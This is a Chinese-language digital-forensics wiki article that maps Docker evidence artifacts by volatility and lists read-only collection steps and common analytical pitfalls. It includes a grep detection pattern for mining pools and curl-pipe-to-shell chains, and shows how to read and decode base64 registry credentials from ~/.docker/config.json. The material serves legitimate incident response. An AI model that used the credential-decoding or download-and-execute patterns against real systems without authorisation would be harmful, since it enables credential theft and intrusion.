---
title: "Docker 取证工件地图"
slug: "server-docker-docker-artifact-map"
canonical: "https://www.digiforensics.cn/wiki/server-docker-docker-artifact-map"
license: "CC-BY-SA-4.0"
author: "DigiForensics"
updated_at: "2026-10-09T12:51:52+08:00"
source_url: null
references: ["https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans"]
source_type: "wiki-sync"
category: "server"
space: "服务器与云取证"
node_path: ["Docker"]
---

# Docker 取证工件地图

> 原文链接：[DigiForensics Wiki · 在线阅读](https://www.digiforensics.cn/wiki/server-docker-docker-artifact-map)

<a id="section-1"></a>

## 一、概述

服务器取证的对象是一台**还在跑**的机器，证据与业务共存在同一套系统里。

容器把这件事又推了一层：业务代码、运行时状态、配置与日志被切成若干个独立生命周期——有的随进程消失、有的随容器删除、有的写进宿主磁盘长期存在。

分析者若按 Linux 服务器的老习惯去找 `/tmp`、`auth.log`、`.bash_history`，会漏掉容器里发生的一切。

涉 webshell、数据窃取、挖矿类案件里，容器已是高频起点：微服务架构的业务代码由 CI 打成镜像推入私库，入侵者拿到 Docker 或 K8s API 权限后**不必碰宿主机上任何业务目录**，直接起一个自己的容器就够了。

痕迹形态随之从"某个文件被改了"变成"某个容器被创建过、某个镜像被拉过、某个卷里多了一个文件"。

容器取证真正的难点不在找不到东西，而在它的证据是混合体：

| 证据类型 | 载体 | 生存期 |
|---|---|---|
| 容器内进程、内存、打开的文件 | **宿主机内存** | 容器停止即消失 |
| 容器内文件的改动（未挂卷部分） | **`overlay2/<id>/diff/`**（upperdir） | `docker rm` 即消失 |
| 容器元数据、启动参数、挂载表 | `containers/<id>/config.v2.json` | 容器被删即消失 |
| 容器标准输出 / 错误日志 | `containers/<id>/<name>-json.log` | 容器被删即消失 |
| 写入 named volume / bind mount 的数据 | `volumes/<name>/_data`、宿主机业务目录 | **长期留存** |
| 镜像及其全部层 | `image/`、`overlay2/` | 直到 `image rm` 或 `prune` |
| 守护进程配置与事件 | `daemon.json`、dockerd 日志 | 长期留存（`events` 缓冲除外） |

**结论先行**：容器取证的成败往往不在分析方法，而在**动手时机**。

容器一旦被 `stop`，进程内存与已建立连接就没了；一旦被 `rm`，容器内的一切（改过的文件、装过的软件、跑过的挖矿进程）连同可写层目录一起彻底消失，只剩镜像和卷。

**在取证流程中的位置**：本篇是**容器场景的入口与导航**，属于采集环节的前置判定层。

它不解析任何结构，只回答三个问题：**数据在哪里、有多久的存活期、该先固定什么**。

层结构解析见 [镜像层与 overlay2 解析](server-docker-overlay2.md)，持久数据见 [Volume 与绑定挂载取证](server-docker-docker-volumes-and-bind-mounts.md)，编排层见 [K8s 取证工件地图](../server-k8s/server-k8s-kubernetes-artifact-map.md)。

**Linux 通用痕迹与宿主机层面本篇不重复**，分别见 [Linux 取证工件地图](../../computer/computer-persistence/computer-persistence-persistence-artifact-map.md) 与 [Linux 服务器取证工件地图](../server-panel/server-panel-linux-server-artifact-map.md)。

**涉及的证据形态**（具体到路径，不是"日志文件"这种大类）：

| 路径 | 内容 | 判读要点 |
|---|---|---|
| `/var/lib/docker/image/<driver>/` | 镜像与层索引 | `imagedb/content` 的 JSON 是层链的事实来源 |
| `/var/lib/docker/overlay2/<id>/` | **各容器的可写层与合并视图** | `diff/` 才是改动落点；`merged/` 是运行时视图，**不可直接当证据** |
| `/var/lib/docker/containers/<id>/` | 容器元数据 | `config.v2.json` 含启动参数、挂载表、镜像摘要 |
| `/var/lib/docker/containers/<id>/<name>-json.log` | 容器标准输出 / 错误 | **随容器删除而消失**，是最易失的一类 |
| `/var/lib/docker/volumes/<name>/_data/` | named volume 实际数据 | **持久化边界，攻击者主动选择的落点** |
| `/var/lib/docker/image/<driver>/repositories.json` | 私库地址记录 | 出现陌生 registry 是重要线索 |
| `/etc/docker/daemon.json` | 守护进程配置 | 存储驱动、镜像加速、是否开启远程 API |
| `/etc/docker/certs.d/` | 私库证书 | 私有仓库的认证痕迹 |
| dockerd 日志 | 事件与 API 调用记录 | **含 `events` 缓冲，容量有限、会被覆盖** |

这台主机上曾经运行过哪些容器与镜像、容器启动参数与挂载关系、哪些数据被写到了持久位置、守护进程如何配置。

容器内具体发生过什么（除非容器还在运行或可写层未清理）；某次网络连接的归属进程（需内存或流量证据）。

**"检材里没有容器"不等于"没有容器活动过"**——正确表述是"该容器已不存在于 `/var/lib/docker/containers/`"，见 [4.5 容器视图与文件存在性](#section-34)。

**内容边界**：所有命令面向**已获得合法授权**的目标主机或已制作的只读镜像，目标是发现与固定证据，**不提供任何入侵手段、不涉及逃逸技术的实现**。检测到容器逃逸或特权容器痕迹时，写的是"如何识别"与"如何排除误报"（见 [容器逃逸与运行时痕迹](../server-k8s/server-k8s-container-escape-and-runtime-artifacts.md)）。

**读者前提**：需要 Linux 文件系统与进程模型的基础、Docker 的基本概念（镜像 / 容器 / 卷 / 挂载），以及 [取证工件地图](../../computer/computer-persistence/computer-persistence-persistence-artifact-map.md) 提供的宿主侧全景。

如果主机还是在线的，请先读 [2.4 证据保全的时机问题](#section-6) 与 [3.1 第 0 步](#section-9) 再动手——这一步顺序错了，后面所有分析都是在分析一个已经变过的现场。
<a id="section-2"></a>

## 二、核心原理

<a id="section-3"></a>

### 2.1 容器是"易失证据 + 宿主持久化"的混合体

这是理解容器取证一切取舍的前提。

容器把传统"一个文件系统里混着数据和程序"的结构拆成了**两层**：

```
宿主文件系统（持久）                     容器视图（易失）
─────────────────────                 ─────────────────────
image/         镜像与层                ┌──────────────────┐
overlay2/diff/ 容器改动的实际落点         │  容器内根文件系统 │  ← 只写 upperdir
containers/    元数据 + 日志            │  进程 / 内存     │  ← 停止即失
volumes/       持久数据                 │  挂载点（指向宿主）│ ← 真正的持久边界
                    ↑                   └──────────────────┘
        容器删除 = 左侧对应项一起消失
```

三条必须记住的推论：

1. **容器内的改动默认不落盘。** 容器删除后，攻击者上传到 `/tmp`、改过的容器内 `/etc/passwd`、装的工具全部消失，宿主机上什么痕迹都不留。攻击者**恰恰知道这一点**，所以恶意行为会主动写到 volume、bind mount 目录，或推到镜像里。
2. **"没找到证据"经常等于"容器已被删除"。** 检材里看不到容器，正确表述是"该容器已不存在于 `/var/lib/docker/containers/`"，而不是"未发现容器内活动"。
3. **写 volume 是攻击者主动选择的持久化**，因此**卷里的东西比容器内的更值得查**——这是[第 03 篇](server-docker-docker-volumes-and-bind-mounts.md)称 volume 为"金矿"的原因。
<a id="section-4"></a>

### 2.2 关键路径速查表

数据根默认 `/var/lib/docker`，由 `daemon.json` 的 `data-root` 决定（**必须先确认**）。
| 路径 | 内容 | 取证价值 |
|---|---|---|
| `/var/lib/docker/containers/<id>/config.v2.json` | **`docker inspect` 的完整来源**（启动参数、挂载、Env、State） | ★★★★★ |
| `/var/lib/docker/containers/<id>/<name>-json.log` | **容器 stdout/stderr**，一行一个 JSON | ★★★★★ |
| `/var/lib/docker/containers/<id>/hostconfig.json` | 宿主侧配置（端口绑定、restart 策略、cgroup） | ★★★★ |
| `/var/lib/docker/overlay2/<cache-id>/diff/` | **容器内所有改动的实际落地点**（upperdir） | ★★★★★ |
| `/var/lib/docker/overlay2/<cache-id>/link` | lowerdir 层链 | ★★★ |
| `/var/lib/docker/image/overlay2/imagedb/content/sha256/<h>` | **镜像配置 JSON**（Env/Labels/Cmd/历史） | ★★★★★ |
| `/var/lib/docker/volumes/<name>/_data` | **named volume 的真实数据** | ★★★★★ |
| `/etc/docker/daemon.json` | **守护进程全局配置**（存储驱动、log driver、私库） | ★★★★★ |
| `/etc/docker/certs.d/<registry>/ca.crt` | **仓库 CA**，指向哪里说明拉过哪个源 | ★★★★ |
| `~/.docker/config.json` | **登录凭证**（`auths` + base64 用户名口令，可逆） | ★★★★★ |
| `/var/log/docker.log` 或 `journalctl -u docker` | **守护进程日志**：镜像拉取、容器启停、错误 | ★★★★ |
| `/var/lib/containerd/` | **containerd 数据根**（K8s 环境） | ★★★★ |
| `/var/lib/kubelet/`、`/var/log/pods/`、`/etc/kubernetes/` | **K8s 侧关键路径** | ★★★★★ |

> ⚠️ **三条最容易踩空的路**：① `daemon.json` 改了 `data-root`，默认路径下什么都没有；② **日志驱动不是 `json-file`** 时（`journald`/`fluentd`），`containers/<id>/*-json.log` 不存在；③ K8s 节点上没有 `/var/lib/docker`，容器由 containerd 托管，路径是 `/var/lib/containerd/`。K8s 环境详见[第 04 篇](../server-k8s/server-k8s-kubernetes-artifact-map.md)。

<a id="section-5"></a>

### 2.3 docker CLI 是取证用的"活体视图"

目标机在线时，`docker` CLI 提供的信息比离线读文件方便，且**大部分只读**。

优先用 CLI 拿快照，再落磁盘深挖。

| 命令 | 取证作用 | 注意 |
|---|---|---|
| `docker info` | 确认**存储驱动**、日志驱动、cgroup 版本 | `Storage Driver` 决定后面读哪个目录 |
| `docker ps -a --no-trunc` | **全部容器含已退出的**；`--no-trunc` 给完整 ID | 不加则只见 12 位短 ID，与目录名对不上 |
| `docker inspect <id>` | **容器全量配置**，本文核心工件 | 存在即说明容器未被 `rm` |
| `docker logs --timestamps --tail all <id>` | **容器全部输出** | 受 log driver 轮转配置限制 |
| `docker diff <id>` | 容器内相对镜像的所有变更 | 只能对**未删除**的容器用 |
| `docker top <id>` / `docker stats --no-stream <id>` | 进程列表、瞬时资源 | 抓挖矿（CPU 常 100%）的好办法 |
| `docker events --since 24h` | 容器启停/镜像拉取事件 | **dockerd 重启即清空**，条目数也有限 |
| `docker image ls --no-trunc` / `image inspect` | 镜像清单与历史 | 离线等价见[第 02 篇](server-docker-overlay2.md) |
| `docker volume ls -f dangling=true` / `volume inspect` | 卷清单与挂载关系 | **`ls` 不显示未挂载的卷**，要加 `-f dangling=true` |
| `docker export -o out.tar <id>` | 导出容器文件系统 | 大容器耗时长且**丢元数据**，优先离线 |
| `docker cp <id>:/path ./out` | 从容器内拷文件 | 会产生审计日志；容器已停时仍可用 |

> ⚠️ **会改变状态的命令，绝不能顺手执行**：`docker exec`（在容器内跑命令，会写 bash 历史、可能触发已植入的 payload）、`docker commit`（把当前状态固化成新镜像，污染现场）。`docker restart`/`start` 同理——它们会重写 `State.StartedAt` 并丢内存。

<a id="section-6"></a>

### 2.4 证据保全的时机问题（本文最重要）

```
时间轴 ──────────────────────────────────────────────────────────────▶

容器运行中                 docker stop                docker rm
    │                         │                          │
    ├ 内存（进程/连接/打开文件）  │                          │
    ├ upperdir diff/（容器内改动）│  ★ diff/ 仍在磁盘上 ★      │
    ├ config.v2.json + 日志     │  ★ 仍然保留 ★             │
    │                          │                          │  config + 日志 + diff 都消失
    ├── 此刻采集：信息最全 ──┘
                         此时只剩：可写层、元数据、日志、
                         已写入 volume / bind mount 的数据、镜像
                                              此时只剩：镜像、volume
```

| 操作后 | 仍在的证据 | 已消失的证据 |
|---|---|---|
| `docker stop` | 容器可写层 `overlay2/<id>/diff/` 完整保留、`inspect` 的全部 `Config`/`HostConfig`/`Mounts`、**完整 stdout/stderr 日志**、已写入卷与 bind mount 的数据、镜像层 | **只丢内存态**：正在跑的外连、未落盘的临时文件、进程内的解密态；★ **可离线 `mount` 该层取证** |
| `docker rm` | 卷数据、bind mount 目录、镜像层、dockerd 日志 | 上述全部 + **容器元数据、日志与可写层目录** |
| `docker volume rm` | bind mount、镜像 | **卷内数据** |
| `docker image rm` / `system prune` | bind mount | 镜像及其所有层 |
| `dockerd` 重启 | 磁盘上的一切 | `docker events` 缓冲、内存、未落盘数据 |

> ⚠️ 必须区分 `stop` 与 `rm`，这是本章最容易被写错的一处。 容器**停止**只是进程退出，可写层 `diff/` 仍在 `overlay2` 目录里——文件系统的取证工作并没有因此中止。**真正不可逆的是 `docker rm`**：它删除容器元数据、日志文件与可写层目录。运维在"先停服务"的直觉下做 `stop` 是可以理解的，但紧接着的 `docker rm -f` 才是把证据彻底抹掉的那一步。报告里遇到"容器已停止"的现场，第一步不是放弃，而是去 `overlay2/` 里把可写层拷出来（见[第 02 篇](server-docker-overlay2.md)）。

**三条由此推出的操作纪律**：

1. 顺序不可颠倒：先内存 → 后容器状态 → 后磁盘。

内存里只有活进程才有的东西（正在跑的外连、解密中的密钥）；容器状态里有"谁在何时用什么参数起了什么容器"；磁盘里是落地的数据。反过来做，第二步信息会丢。

2. `docker inspect` 与 `docker logs` 必须在 `docker rm` 之前跑完并落盘。

`stop` 之后二者仍可用（`Config` 是静态文件、日志是文件），**`rm` 之后彻底没了**。

同时`stop` 之后要立刻备份 `overlay2/<id>/diff/`——可写层还在，但下一次 `docker rm` 就会连带删掉。

3. **不要为了"干净"而清理。**

`docker system prune`、`volume prune`、`docker rm`、`builder prune` 都是**不可逆的证据销毁操作**。

发现可疑容器时正确动作是**先固定，再由委托方决定**。

<a id="section-7"></a>

### 2.5 存储驱动的版本差异

读 `overlay2` 目录前必须确认存储驱动，位置与含义随版本变化：
| 存储驱动 | 大致版本 | 目录形态 | 取证注意 |
|---|---|---|---|
| `aufs` | Docker ≤ 17.05（AUFS 已停止维护） | `/var/lib/docker/aufs/` | `mnt` 前缀的挂载式结构，非标准 `diff/` |
| `devicemapper` | Docker ≤ 17.05 常见 | `/var/lib/docker/devicemapper/` | 数据在块设备映射出的稀疏文件里，**无法直接当目录读** |
| `overlay2` | **Docker 17.06 之后默认** | `overlay2/<id>/{diff,merged,work,link}` | 常规取证首选，详见[第 02 篇](server-docker-overlay2.md) |
| `btrfs` / `zfs` | 特殊存储后端 | 子卷形态 | 需专用工具导出子卷 |

> **判断方法**：`docker info` 的 `Storage Driver` 一行；离线看 `daemon.json` 有无 `storage-driver` 字段；再退一步看 `/var/lib/docker/` 下实际存在哪个目录——**目录里有什么就说明当时用的是哪个**（迁移期间可能并存）。

---

<a id="section-8"></a>

## 三、操作步骤

<a id="section-9"></a>

### 3.1 第 0 步（在线时）：按"存活时间"排序的抢占式固定

**这一步的顺序本身就是取证方法。**

先抢最易失的。

```bash
# ---- 0.1 时间基准（先记，它几秒后就变）----
date -u '+%Y-%m-%dT%H:%M:%SZ' | tee /evidence/collection-utc.txt
timedatectl 2>/dev/null | tee -a /evidence/collection-utc.txt   # 时区，影响时间线对齐

# ---- 0.2 内存（最易失，优先级最高）----
sudo ./avml /evidence/DigiForensics-mem.raw            # 静态可执行，LiME 需编译加载模块
sha256sum /evidence/DigiForensics-mem.raw | tee /evidence/mem.sha256

# ---- 0.3 宿主机活体状态（挖矿/外连在这里露头）----
ps auxwwf | tee /evidence/ps-live.txt
ss -tulpn | tee /evidence/netstat-live.txt
ss -tapn state established >> /evidence/netstat-live.txt

# ---- 0.4 ★ 容器状态（Config 与日志，再晚一步就可能被 rm 掉）----
mkdir -p /evidence/docker
docker version > /evidence/docker/version.txt 2>&1
docker info  > /evidence/docker/info.txt    2>&1   # 重点看 Storage Driver / Logging Driver
docker ps -a --no-trunc > /evidence/docker/ps-all.txt 2>&1
docker image ls --no-trunc -a > /evidence/docker/images.txt 2>&1
docker volume ls -f dangling=true > /evidence/docker/volumes-dangling.txt 2>&1
docker events --since 72h --until 0s > /evidence/docker/events.txt 2>&1 || true  # 缓冲可能已清空
for c in $(docker ps -aq); do
  docker inspect "$c" > "/evidence/docker/inspect-$c.json" 2>/dev/null
  docker logs --timestamps --tail all "$c" > "/evidence/docker/logs-$c.txt" 2>&1
  docker diff "$c" > "/evidence/docker/diff-$c.txt" 2>&1
  docker top "$c"  > "/evidence/docker/top-$c.txt"  2>&1
done
sha256sum /evidence/docker/* | tee /evidence/docker/hashes.txt
# ⚠️ 禁止：docker stop/rm/commit/exec/system prune/volume prune/image prune
```

> ⚠️ `docker events` 只能反映"还活着的窗口"：它是 dockerd 内存里的环形缓冲，**dockerd 一重启就清空**。拿不到事件**不能推出"没有容器活动"**——报告里必须写成"守护进程日志缓冲不覆盖该时段"。

<a id="section-10"></a>

### 3.2 第 1 步：确认存储驱动与真实数据根

```bash
grep -nE 'data-root|storage-driver|log-driver|insecure-registries' /etc/docker/daemon.json 2>/dev/null
# 目录存在性清单：有什么就读什么（K8s 节点两套都查）
for p in var/lib/docker var/lib/containerd var/lib/kubelet var/log/pods \
         etc/kubernetes etc/docker etc/containerd; do
  [ -e "/mnt/df/$p" ] && echo "存在  /$p" || echo "缺失  /$p"
done
ls -1 /mnt/df/var/lib/docker/           # image / overlay2 / containers / volumes / aufs ...
ls -1 /mnt/df/var/lib/docker/overlay2/ | wc -l   # 层数量级
```

| 观察结果 | 结论 |
|---|---|
| 无 `containers/` 但有 `volumes/` 与 `image/` | 容器全被删了，只剩数据 → 见 2.4 的"证据灭失"行 |
| 有 `containers/` 且目录数 > 0 | 存在未删除容器，`config.v2.json` 与日志可读 |
| `overlay2/` 目录数远多于镜像层数 | 差额部分通常就是**仍在运行的容器 upperdir** |
| 无 `overlay2/`，有 `aufs/` 或 `devicemapper/` | 老版本，见 2.5 |

<a id="section-11"></a>

### 3.3 第 2 步：容器 → 磁盘的落地映射

`GraphDriver.Data.UpperDir` 与 `LogPath` 是**从逻辑对象跳到物理文件的关键字段**，拿到它们就等于拿到了取证路径。
```bash
# 在线：jq 从 inspect 抽落地路径（jq 需 apt install jq / yum install jq）
CID=$(docker ps -aq | head -1)
docker inspect "$CID" | jq '.[0] | {Id, Image,
  Upper: .GraphDriver.Data.UpperDir, Work: .GraphDriver.Data.WorkDir, Merged: .GraphDriver.Data.MergedDir,
  LogPath, StartedAt: .State.StartedAt, FinishedAt: .State.FinishedAt, ExitCode: .State.ExitCode,
  Privileged: .HostConfig.Privileged, Binds: .HostConfig.Binds,
  Mounts: [.Mounts[] | {Type, Source, Destination, RW}]}'

# 离线：直接从 config.v2.json 读同一批字段
python3 -c "
import json,glob
for f in sorted(glob.glob('/mnt/df/var/lib/docker/containers/*/config.v2.json')):
    d=json.load(open(f)); c=d.get('Config',{}); g=d.get('GraphDriver',{}).get('Data',{})
    print('==', d.get('Name'), d.get('Created'))
    print('  UpperDir:', g.get('UpperDir'), '| LogPath:', d.get('LogPath'))
    print('  Cmd/Entrypoint:', c.get('Cmd'), c.get('Entrypoint'))
    print('  Env     :', c.get('Env'))
    print('  Labels  :', c.get('Labels'))
    print('  Mounts  :', d.get('MountPoints'))
"
```

**高价值字段与它们的证据含义**：

| 字段 | 看到什么 = 什么结论 |
|---|---|
| `Config.Cmd` / `Config.Entrypoint` | **攻击者起容器执行了什么命令**——判断行为的直接证据 |
| `Config.Env` | 注入的口令、令牌、**私库地址**（`REGISTRY=`） |
| `Config.Labels` | `com.docker.compose.*` 泄露编排结构；自定义 label 可能是攻击者标记 |
| `Config.Volumes` | 镜像声明的卷 → 与运行时 `Mounts` 对比可发现**多挂的目录** |
| `HostConfig.Privileged: true` | **特权容器 = 已具备逃逸条件**，见[第 06 篇](../server-k8s/server-k8s-container-escape-and-runtime-artifacts.md) |
| `HostConfig.Binds` 命中 `/var/run/docker.sock` | 挂 Docker socket = 实际等同宿主机 root |
| `HostConfig.CapAdd` 非空、`NetworkMode: host` | 隔离被削弱 |
| `State.StartedAt` / `FinishedAt` / `ExitCode` | **时间线的核心锚点**，判断容器是否"用过就删"过 |
| `State.OOMKilled: true` | 曾被内存耗尽杀死（挖矿/压测的间接线索） |
| `Mounts[].Source` | **宿主机路径**，可直接进入常规文件系统取证流程 |

<a id="section-12"></a>

### 3.4 第 3 步：日志与配置类工件

```bash
# 容器日志：JSON Lines，一行一个对象，Log 字段是原始输出
# {"log":"...","stream":"stdout","time":"2024-03-17T14:48:03.123456789Z"}
ls -l --time-style=long-iso /mnt/df/var/lib/docker/containers/*/*-json.log
# 可疑关键词（挖矿池 / 下载执行链）
grep -aiE 'stratum\+tcp|xmrig|monero|pool\.|wget |curl .*\| *(ba)?sh|base64 -d|chmod \+x' \
     /mnt/df/var/lib/docker/containers/*/*-json.log | head -40

# 守护进程配置与日志
cat /mnt/df/etc/docker/daemon.json
ls -R /mnt/df/etc/docker/certs.d/ 2>/dev/null        # 仓库 CA，说明拉过哪些源
journalctl -u docker --since '2024-03-01' 2>/dev/null | grep -iE 'pull|error|denied' | head -50
# 离线读 journal 归档：journalctl --file=/mnt/df/var/log/journal/<id>/system.journal

# ★ Docker 登录凭证（base64 可逆 = 明文口令）
cat /mnt/df/root/.docker/config.json 2>/dev/null
# {"auths":{"registry.local":{"auth":"cmVncn...="}}}
```

> ⚠️ **时间戳时区陷阱**：容器日志用 **RFC3339 UTC**（`time` 字段带 `Z`），而 dockerd 日志与 ext4 文件时间戳用**本地时间**。同一台机器上两者混排，不换算就会排出错误的时间线。

<a id="section-13"></a>

### 3.5 第 4 步：验证环节

| 验证对象 | 方法 | 通过标准 |
|---|---|---|
| 容器 ID 与目录对应 | `docker ps -aq` 逐个与 `containers/<id>/` 比对 | 数量一致；不一致的差集本身是结论（有残留/有删除） |
| 镜像层完整性 | 见[第 02 篇](server-docker-overlay2.md)的 diff_id 链 | `RootFS.Layers` 数与 `overlay2/` 目录数可对应 |
| 挂载点与宿主机数据一致 | 在 `Mounts[].Source` 目录里找容器内看到的文件名 | 双向都能找到 |
| 时间线一致性 | 容器 `StartedAt` / upperdir mtime / 日志 `time` | 三者可对齐；矛盾处需解释 |
| 分析未污染证据 | `umount` 后 `sha256sum -c` | 全部 OK |

---
<a id="section-14"></a>

## 四、常见陷阱

容器取证的误判多数不是「看不懂格式」，而是**把证据的存续状态当成了事实状态**：容器删了就说没入侵、缓冲清空就说没活动、路径猜错就说没文件。

<a id="section-15"></a>

### 4.1 工件定位与环境判定

<a id="section-16"></a>

#### 陷阱 1：默认数据根是 `/var/lib/docker`

**现象**：在挂载镜像上只查 `/var/lib/docker`，发现目录几乎为空，随即在报告里写「该主机无容器运行痕迹」。

**原因**：`daemon.json` 的 `data-root` 可以指向任意路径，运维把数据目录挪到数据盘是常见做法；此外 K8s 节点上根本没有 `/var/lib/docker` 这套结构，容器由 containerd 托管，数据在 `/var/lib/containerd/`。

目录为空不等于没有容器，只等于你没有站在它实际所在的位置上找。

**影响**：这是把「找错地方」升格为「否定事实」。

委托方看到「无容器痕迹」会认为环境干净或容器技术未被使用，而真实情况可能是一个正在运行的挖矿容器。

这一条不成立，报告里所有关于容器的结论都要跟着作废。

**核查**：**先判定环境、再决定路径**——读 `daemon.json` 的 `data-root`/`storage-driver`/`log-driver`，读 `/var/lib/docker/` 下实际存在哪个目录（有 `overlay2` 还是 `aufs`），并在 K8s 节点上额外查 `/var/lib/containerd/`、`/var/lib/kubelet/`、`/var/log/pods/`。

路径结论必须写明依据（配置文件字段或目录存在性），不能默认。

<a id="section-17"></a>

#### 陷阱 2：把日志驱动当作 `json-file`

**现象**：`docker logs` 报错或 `containers/<id>/*-json.log` 不存在，分析员据此判断「容器没有产生输出」。

**原因**：日志驱动由 `daemon.json` 的 `log-driver` 或容器的 `HostConfig.LogConfig` 决定。配置成 `journald`、`fluentd`、`gelf` 等第三方驱动时，容器日志根本不会落成 JSON Lines 文件，而是进 journald 或发往远端。

**「找不到文件」和「没有日志」是两件事。**

**影响**：容器内的攻击者活动往往只体现在 stdout/stderr（下载命令、报错、异常栈）。

判成「无输出」就等于放弃这条最省事的线索，进而可能得出「容器未被使用」的错误结论。

**核查**：用 `docker info` 确认 `Logging Driver`，再按驱动选路径：`json-file` 读 `containers/<id>/<name>-json.log`；`journald` 用 `journalctl CONTAINER_NAME=<name>` 查；外发驱动则要向日志平台调取。

查完仍为空时，表述写成「该驱动配置下未检索到容器标准输出记录」，而不是「容器无输出」。

<a id="section-18"></a>

#### 陷阱 3：只用 12 位短 ID 去对目录

**现象**：`docker ps` 里看到 `9d8e7f6a5b41`，到 `/var/lib/docker/containers/` 下找不到同名目录，判为「容器已删除」。

**原因**：`containers/` 下的目录名是**完整 64 位 ID**，`docker ps` 默认显示 12 位短 ID。短 ID 是完整 ID 的前缀，两者目录名长得不一样是正常的。

另外 `--no-trunc` 之外的输出还可能带显示宽度截断。

**影响**：把「路径写错」当成「证据消失」，对一个仍然存在、元数据与日志完整的容器下了「已被清理」的结论。

这类错误会连带影响时间线——`State.StartedAt`/`FinishedAt` 是核心锚点，判错容器存在性等于丢掉整个时段。

**核查**：一律用 `docker ps -aq --no-trunc` 取完整 ID，或离线遍历 `containers/*/config.v2.json` 的文件名作为 ID 清单，再与 `docker ps` 输出做前缀匹配。

对不上的**差集本身才是结论**，要写成「存在配置目录但不在容器列表中」或「列表中有容器但无对应目录」。

<a id="section-19"></a>

#### 陷阱 4：把 `docker events` 为空当成无活动

**现象**：`docker events --since 72h` 输出为空，报告写「该时段内无容器创建或启动活动」。

**原因**：`docker events` 读的是 **dockerd 进程内存里的环形事件缓冲**，不是落盘日志。

dockerd 一重启（守护进程升级、宿主重启、OOM）缓冲就清零，缓冲本身也有条数上限，且只覆盖最近的窗口。

它反映的是「还活着的那个进程见过的窗口」，不是历史全量。

**影响**：这是典型的假阴性。

入侵者若在 dockerd 重启后创建并删除了容器，`events` 里不会有任何记录，而分析员却会把「缓冲为空」写成「无活动」，等于给了一条反向的伪证。

**核查**：`events` 只能作为**辅助**时间线，不能作为否定依据。

真正的历史来源是三样：容器日志文件的 mtime 与最早时间戳、`config.v2.json` 的 `Created` 与 `State` 字段、dockerd 自身的日志（`journalctl -u docker`）。

事件缺失时结论应写成「**dockerd 事件缓冲不覆盖该时段**（可能因守护进程重启或缓冲上限），活动情况需以容器日志时间戳与 `State` 字段重建」。

<a id="section-20"></a>

### 4.2 时机与采集顺序

<a id="section-21"></a>

#### 陷阱 5：★ 先 `docker stop` 再采集

**现象**：到达现场时服务异常，运维或分析员先执行了 `docker stop`/`restart`，然后才开始固定证据，最终报告写「容器内未见异常进程」。

**原因**：`stop` 只是结束容器主进程。

进程内存、已建立的对外连接、容器内尚未落盘的临时文件在这一刻全部消失，而这些恰恰是判断挖矿进程、内存注入、运行时解密最直接的证据。

更麻烦的是 `restart` 会重写 `State.StartedAt`，把「本次启动」和「上次启动」在元数据里抹平。

**影响**：这是不可逆的操作，且损失无法在事后补救。

报告中「未见异常进程」将失去证明力——真实情况可能是存在已被终止的挖矿进程，而矿池账号与钱包地址只能从进程命令行与内存里拿到。

**核查**：顺序固定为内存 → 活体状态 → 容器状态 → 磁盘，全程只读。

确实需要停服时，必须由委托方书面同意并记录停服时刻（UTC），停服后立刻转去备份 `overlay2/<id>/diff/`。

若现场已发生重启，报告的「局限」一栏必须写明「原进程内存内容因重启不可得，本结论基于 `ps` 快照、容器配置与日志」。

<a id="section-22"></a>

#### 陷阱 6：以为「停止」就没证据了

**现象**：看到容器状态是 Exited，直接跳过，转去查镜像与卷。

**原因**：**`docker stop` 不删任何磁盘工件**。

容器可写层 `overlay2/<id>/diff/` 仍在、元数据 `config.v2.json` 仍在、`*-json.log` 仍在，容器内所有文件改动都可以离线从该层读出来。

**真正不可逆的是 `docker rm`**——它删除元数据、日志文件与可写层目录。

**影响**：已停止的容器恰恰是取证价值最高的一类：进程已经消失，不会再有对抗行为，可写层却完整保留。

这是「最容易拿到完整文件系统」的窗口，放弃它等于把最容易的一批证据丢掉。

**核查**：遇到 Exited 容器，第一件事是按 `config.v2.json` 里的 `GraphDriver.Data.UpperDir` 定位并整目录备份可写层，其次落盘 `docker inspect` 与 `docker logs`。

报告中明确写出「容器已停止但可写层完整保留，容器内文件改动可离线取证」。

<a id="section-23"></a>

#### 陷阱 7：在目标机用 `docker exec` 查东西

**现象**：为了看容器里有什么，直接 `docker exec -it <id> bash` 进去翻文件、看进程。

**原因**：`exec` 会在容器内启动新进程，写入 shell 历史，改变容器内的 mtime 与 `diff/` 内容。

更关键的是，如果容器内已被植入延迟触发或看环境才执行的载荷，这个动作等于主动触发它。

同时这条命令会留在 dockerd 日志里，成为证据自身被污染的记录。

**影响**：污染是双向的——既可能销毁原始状态（被改掉的 mtime 无法复原），也可能提前引爆恶意逻辑，让后续分析看到的是攻击者预设的「后门状态」而非真实状态。

这类污染在报告里几乎无法补救。

**核查**：容器内的信息一律用**只读替代手段**取得：`docker cp` 取文件、`docker logs` 取输出、`docker diff` 取变更清单、可写层离线挂载读。

确需在容器内执行命令时，必须先书面说明目的，并把它造成的状态变化写进报告的「操作影响」一节。

<a id="section-24"></a>

#### 陷阱 8：把 `docker diff` 当成时间来源

**现象**：拿 `docker diff` 的输出（`C /etc/passwd`、`A /tmp/x`）推断文件何时被改动。

**原因**：`docker diff` 只输出**相对镜像的差异清单**（路径 + 增删改类型），**完全不含任何时间信息**。

它反映的是「与镜像相比哪里不同」，而不是「什么时候变的」。

**影响**：分析员会不自觉地拿文件 mtime 去套 `diff` 的结果，但容器可写层里的 mtime 会被后续操作覆盖，也可能与实际写入时刻不一致（解包工具、tar 归档会保留归档内的原始时间）。

基于错误时间源的关联分析会把不相干的操作串成一条攻击链。

**核查**：时间锚点只用三类——容器日志 `time` 字段（RFC3339 UTC）、`State.StartedAt`/`FinishedAt`/`Created`、可写层与宿主机文件的 mtime。

`docker diff` 只用于回答「改了什么」，不回答「什么时候改的」。

<a id="section-25"></a>

### 4.3 内容判读

<a id="section-26"></a>

#### 陷阱 9：把 `~/.docker/config.json` 的 `auths` 当成哈希

**现象**：看到 `"auth": "cmVncn...="` 一串 base64，报告写「未获取到明文口令」。

**原因**：Docker 的 `auth` 字段是 **base64 编码的用户名:密码**，不是哈希，不可逆性为零。解码即得明文私库账号口令。

**影响**：两种代价。

往大了说，报告里「未获取明文」会让案件错失把私库访问与攻击者身份直接绑定的机会。

往小了说——也是更现实的一种——这些凭据在检材里以近乎明文的形式躺着，报告或中间产物一旦外流，等同于把私库口令交给任何拿到报告的人。

**核查**：解码核对并在报告中只呈现「某私库的凭据被读取并可能用于拉取镜像」这一结论，口令本身脱敏（如 `cmVn…fQ==`），完整值留在受控证据目录内并单独记录哈希。

凭据属于敏感个人信息，取证报告只写必要字段。

<a id="section-27"></a>

